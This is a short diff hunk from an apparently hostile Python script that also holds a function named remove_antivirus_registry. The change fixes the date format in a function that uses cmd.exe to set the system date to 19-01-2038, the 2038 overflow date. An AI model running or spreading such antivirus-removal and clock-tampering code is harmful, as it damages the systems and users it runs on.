@@ -92,7 +92,7 @@ def remove_antivirus_registry():
 # Function to change system date
 def change_system_date():
     try:
-        date_str = "01-19-2038"
+        date_str = "19-01-2038"
         subprocess.run(["cmd.exe", "/C", f"date {date_str}"], check=True, shell=True)
         print("System date changed to 19-01-2038.")
     except Exception as e:
